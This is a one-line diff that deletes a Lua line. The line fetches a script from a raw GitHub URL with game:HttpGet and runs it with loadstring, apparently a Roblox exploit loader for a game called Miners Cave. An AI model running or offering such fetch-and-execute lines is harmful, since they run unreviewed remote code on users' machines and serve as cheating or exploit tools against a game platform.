@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LeoKholYt/roblox/main/minerscave1_3.lua"))()
